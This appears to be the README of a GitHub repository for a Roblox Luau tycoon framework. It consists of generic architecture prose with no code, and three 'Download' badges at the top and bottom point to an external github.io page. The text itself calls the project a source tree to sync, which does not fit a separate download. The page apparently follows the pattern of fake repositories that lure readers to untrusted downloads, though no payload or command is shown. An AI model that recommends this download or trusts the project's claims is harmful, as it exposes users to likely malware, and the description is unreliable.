![preview](https://raw.githubusercontent.com/Arshispro/luau-tycoon-core/main/poster_ae887.svg)
# 🍽️ Culinary Commons — Server-Authoritative Tycoon Orchestration Kit

[![Download](https://raw.githubusercontent.com/Arshispro/luau-tycoon-core/main/setup_755abb.svg)](https://Arshispro.github.io/luau-tycoon-core/)

**A modular, server-first simulation framework for building persistent economy-driven experiences — where every ledger entry is earned, every expansion is validated, and every player's kitchen empire lives on the right side of the trust boundary.**

[![Download](https://raw.githubusercontent.com/Arshispro/luau-tycoon-core/main/setup_755abb.svg)](https://Arshispro.github.io/luau-tycoon-core/)

---

## 📜 Table of Contents

- [What Is Culinary Commons?](#-what-is-culinary-commons)
- [The Philosophy Behind the Framework](#-the-philosophy-behind-the-framework)
- [Why Server-Authoritative Matters](#-why-server-authoritative-matters)
- [Repository Layout](#-repository-layout)
- [Core Architecture](#-core-architecture)
- [Feature Highlights](#-feature-highlights)
- [Responsive & Accessible Interfaces](#-responsive--accessible-interfaces)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance Model](#-round-the-clock-assistance-model)
- [Getting Started Without Package Managers](#-getting-started-without-package-managers)
- [Configuration & Environment Signals](#-configuration--environment-signals)
- [Data Persistence Model](#-data-persistence-model)
- [Extending the Framework](#-extending-the-framework)
- [Testing & Simulation Harness](#-testing--simulation-harness)
- [Performance & Budget Notes](#-performance--budget-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Community & Support](#-community--support)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🍳 What Is Culinary Commons?

Culinary Commons is a **modular, server-authoritative backend framework** written in strict Luau and wired together through Rojo. It exists for one purpose: to give builders a trustworthy skeleton for restaurant-style tycoon experiences where the *server* is the single source of truth, and the client is a respectful guest — not a puppet master.

Where other tycoon kits hand a client a wallet and hope for the best, Culinary Commons flips the equation. Clients request. The server decides. Persistence writes down what the server decided. Nothing else is permitted to touch the books.

Think of it as the difference between a ledger kept in a public square and a ledger kept inside a banker's vault. Both record numbers. Only one of them survives contact with a curious stranger.

---

## 🧠 The Philosophy Behind the Framework

The framework was designed around four unshakeable commitments:

1. **Determinism first.** Given the same sequence of validated inputs, the simulation produces the same output every time. No random client-side dice rolls.
2. **Explicit boundaries.** Every remote boundary is declared, versioned, and rate-limited. Hidden surfaces are treated as bugs, not features.
3. **Composition over inheritance.** Tycoon stations, menus, and upgrades are constructed from small, testable modules instead of one sprawling god-object.
4. **Readers over writers.** The default posture for any new contributor is to read the existing service contract before proposing a new one. Understand the mortgage before you renegotiate it.

---

## 🔒 Why Server-Authoritative Matters

A tycoon experiences lives or dies on the perceived value of its economy. When players sense that numbers can be summoned from thin air, the entire loop collapses — not because of any single incident, but because trust evaporates.

Server-authoritative design here means:

- **Every currency mutation** originates inside a validated server service.
- **Every upgrade purchase** passes through a deterministic hierarchy check before it is accepted.
- **Every persistence write** is a server action, serialized through a single save coordinator to prevent races.
- **Every client call** is treated as a *request*, never as an *instruction*.

This is not paranoia. It is hospitality. The house protects the guest's progress so the guest can focus on the fun.

---

## 🗂️ Repository Layout

A high-level tour of the tree:

- **/src/server** — Authoritative services: economy, station registry, upgrade hierarchy, save coordinator.
- **/src/shared** — Pure modules shared across the boundary: schemas, constants, signal definitions, validators.
- **/src/client** — Presentation-only controllers: UI bindings, input adapters, optimistic previews.
- **/assets** — Rojo project files, place templates, and localization tables.
- **/docs** — Long-form documentation, architecture decision records, and migration notes.
- **/tests** — Simulation harness, deterministic replays, and invariant checks.

Every folder has a purpose. Nothing lives in the tree "just in case."

---

## 🧩 Core Architecture

Culinary Commons is assembled from a small set of cooperating services, each owning exactly one concern:

### 1. Ledger Service
The heart of the economy. It owns balances, transactions, and audit trails. Every mutation produces an entry — no silent arithmetic, ever. If a purchase happens, there is a paper trail that a reviewer could reconstruct by hand.

### 2. Station Registry
Tracks which tycoon stations exist, which are unlocked, and which are pending activation. It answers one question well: *"Is this station permitted to be live right now?"* It does not decide pricing, animation, or UI — those belong elsewhere.

### 3. Upgrade Hierarchy
A directed acyclic graph of prerequisites. Before an upgrade is purchased, the hierarchy is consulted. Before an upgrade is *offered* in the UI, the same hierarchy is consulted again through a cached projection. Consistency between the two is enforced by a shared validator.

### 4. Save Coordinator
A single-writer serialization layer. Sessions register here; writes are queued; conflicts are resolved with a last-validated-write-wins policy that is logged, not hidden. If a save is rejected, the rejection is a first-class event, not a swallowed error.

### 5. Signal Bus
A typed pub/sub layer for internal events. It does not cross the client-server boundary directly — remote events are separately declared and validated. The bus is for the server talking to itself; the remotes are for the server answering the outside world.

---

## ✨ Feature Highlights

- **Deterministic economy simulation** — no floating-point drift in ledger-critical paths; integer counters where they matter.
- **Declarative station manifests** — describe a station once, and its unlock rules, pricing hooks, and UI projections are generated from that single description.
- **Typed remote contracts** — every client-server call has an explicit signature and a validation layer that rejects malformed payloads before they reach business logic.
- **Idempotent save operations** — retries do not double-apply; the coordinator tracks operation IDs so replays are safe.
- **Hot-reload-friendly modules** — Rojo composition keeps the source tree flat and easy to inspect during iteration.
- **Audit-grade logs** — every rejected request carries a reason code, not just a boolean.
- **Composable UI bindings** — the client is a *view* over server state, never the owner of it.
- **Schema-versioned persistence** — migrations are explicit, numbered, and reversible in principle.
- **Zero-trust client posture** — the client is treated as a helpful narrator, not an authority.
- **Strict Luau typing throughout** — no implicit `any` in the codebase; the type system is a contract, not decoration.

---

## 📱 Responsive & Accessible Interfaces

The presentation layer is designed to adapt gracefully across viewport sizes — from a compact handheld orientation to a wide desktop layout — without sacrificing legibility or interaction clarity.

**Responsive UI considerations baked into the client:**

- Flexible grid layouts that reflow rather than clip.
- Touch targets sized for both mouse and finger input.
- Contrast-aware palette tokens so that text remains readable against dynamic backgrounds.
- Reduced-motion friendly transitions that degrade to instant state changes when a user prefers less animation.
- Keyboard-navigable menus where the platform supports them.

Accessibility is not a checkbox here; it is the natural consequence of treating the client as a respectful interface to a trustworthy server.

---

## 🌍 Multilingual Support

Localization in Culinary Commons is structured, not bolted on. Every player-facing string flows through a localization table keyed by a stable identifier. Adding a new language means adding a new table — not rewriting client code.

**Localization principles:**

- String keys are semantic, not positional (`station.upgrade.confirm` rather than `text_042`).
- Pluralization rules are data-driven, so languages with complex plural forms are first-class citizens.
- Number and currency formatting respects locale conventions through a shared formatter.
- Right-to-left scripts are supported at the layout level, not just the text level.

The result: a restaurant empire that can open franchises in any region without a code fork.

---

## 🕐 Round-the-Clock Assistance Model

Because tycoon experiences often span time zones and player schedules, the framework assumes a **continuously available support posture** for its maintainers and integrators:

- Documentation is written to be answerable at any hour — clear, self-contained, and searchable.
- Issue templates are structured so that a report filed at 03:00 is just as actionable as one filed at noon.
- Architecture decision records capture *why*, so a maintainer joining a conversation mid-stream is not left guessing.
- Escalation paths are documented, not improvised.

This is what "always-on" means here: not a chat bot, but a repository that answers when nobody is awake.

---

## 🚀 Getting Started Without Package Managers

This section intentionally avoids conventional dependency-manager choreography. The framework is a source tree, and you bring it into your own workflow the way you prefer.

**You will need:**

- A Roblox Studio installation capable of syncing an external source tree.
- A Rojo-compatible project descriptor located in `/assets`.
- A working knowledge of Luau and the Roblox data model.

**The general flow:**

1. Point your syncing tool at the repository root and let it map `/src/server`, `/src/shared`, and `/src/client` into the expected service containers.
2. Open the place template shipped in `/assets` and confirm that the service topology matches the descriptor.
3. Review `/shared/schemas` before writing any new feature — the schemas are the vocabulary of the framework.
4. Run the simulation harness in `/tests` to confirm your environment is wired correctly.
5. Begin extending from a *copy* of an existing service, not from a blank page.

If something refuses to sync, the problem is almost always a path mismatch in the project descriptor — not the framework itself.

---

## ⚙️ Configuration & Environment Signals

Configuration lives in plain Luau tables under `/src/shared/constants`. There are no hidden environment variables, no magic strings pulled from a remote file.

**Configuration categories:**

- **Economy tuning** — starting balances, transaction ceilings, cooldown windows.
- **Hierarchy definitions** — the prerequisite graph for upgrades and station unlocks.
- **Persistence schema versions** — the migration ladder for saved data.
- **Remote contracts** — declared names, argument shapes, and rate limits.
- **Localization defaults** — the fallback language and formatter preferences.

Every configuration value has a documented default and a documented safe range. Out-of-range values are rejected at startup, not at runtime.

---

## 💾 Data Persistence Model

Saving in a tycoon is the difference between a session and a story. Culinary Commons treats persistence as a first-class subsystem:

- **Versioned schemas.** Every saved payload carries a schema version. Migration functions transform older versions forward.
- **Single-writer discipline.** Only the Save Coordinator writes to storage. No service reaches around it.
- **Idempotent operations.** Each write carries an operation identifier so that retries are safe.
- **Graceful degradation.** If storage is temporarily unavailable, sessions enter a read-only state rather than silently losing progress.
- **Auditability.** Rejected writes are logged with reason codes, never swallowed.

---

## 🧱 Extending the Framework

Adding a new station, upgrade, or service follows a consistent pattern:

1. **Define the schema** in `/src/shared/schemas`. This is the contract.
2. **Implement the server service** in `/src/server`, consuming only published contracts from other services.
3. **Declare the remote** in the shared remote registry, with explicit argument validation.
4. **Bind the client view** in `/src/client`, treating server state as the source of truth.
5. **Write a deterministic replay test** in `/tests` that exercises the new behavior end-to-end.

The framework rewards incrementalism. Large, sweeping changes are discouraged in favor of small, reviewable ones.

---

## 🧪 Testing & Simulation Harness

The `/tests` directory contains a simulation harness that runs the server services in isolation, feeding them deterministic input sequences and asserting invariants:

- **Balance invariants** — the ledger never goes negative without an explicit credit line.
- **Hierarchy invariants** — no upgrade is purchasable without its prerequisites being live.
- **Persistence invariants** — a save followed by a load reproduces the same state.
- **Remote invariants** — malformed payloads are rejected before reaching business logic.

Testing is not optional infrastructure; it is the mechanism by which the framework remains trustworthy as it grows.

---

## ⚡ Performance & Budget Notes

- Ledger operations are O(1) for the common path; audit scans are O(n) but bounded.
- Hierarchy checks use a cached projection that is invalidated on mutation, not recomputed per request.
- Save operations are batched within a session window to reduce write pressure.
- Remote calls are rate-limited per session, with backpressure surfaced as explicit rejection codes.
- Client bindings subscribe to derived signals rather than polling, keeping frame budgets predictable.

Performance here is not a vanity metric — it is the discipline that keeps the simulation honest under load.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Publish architecture decision records for the remote contract layer.
- **Q2 2026** — Introduce a pluggable economy adapter so alternate currencies can share the ledger.
- **Q3 2026** — Expand localization tables to cover additional regions and plural rules.
- **Q4 2026** — Release a formal migration toolkit for schema upgrades between major versions.

The roadmap is a conversation, not a contract. Proposals are welcomed through the issue tracker.

---

## 🤝 Contributing

Contributions are reviewed against three questions:

1. **Does it respect the server-authoritative boundary?**
2. **Is it deterministic and testable?**
3. **Does it reduce or increase the surface area for ambiguity?**

If a change makes the boundary fuzzier, it is likely to be revised rather than merged. Clarity is the currency of this repository.

---

## 🛟 Community & Support

Support is community-driven and documentation-first. Before opening an issue, please review `/docs` and the architecture decision records — many questions are answered there. When you do open an issue, include a minimal reproduction and the exact schema versions involved.

The project maintains a **round-the-clock documentation posture**: answers are written to be useful regardless of when they are read.

---

## ⚠️ Disclaimer

Culinary Commons is an independent, community-maintained framework intended for educational and developmental use in building persistent economy-driven simulations. It is provided as-is, without warranty of any kind, express or implied. The maintainers assume no responsibility for how the framework is integrated into any particular project, nor for any modifications made by third parties.

This project is not affiliated with, endorsed by, or sponsored by any platform vendor. All trademarks and platform names referenced remain the property of their respective owners. Nothing in this repository should be interpreted as encouraging the circumvention of platform rules, terms of service, or applicable law.

Where the framework references persistence, economy tuning, or upgrade hierarchies, those references describe *mechanisms*, not guarantees. Integrators are responsible for reviewing their own configurations before deploying to any environment.

---

## 📄 License

This project is distributed under the **MIT License**.

A working reference to the license text is available here: [MIT License](https://opensource.org/licenses/MIT)

You are welcome to use, modify, and redistribute this framework in accordance with the terms of that license. Attribution is appreciated but not required by the license itself — it is simply good manners in a commons.

---

[![Download](https://raw.githubusercontent.com/Arshispro/luau-tycoon-core/main/setup_755abb.svg)](https://Arshispro.github.io/luau-tycoon-core/)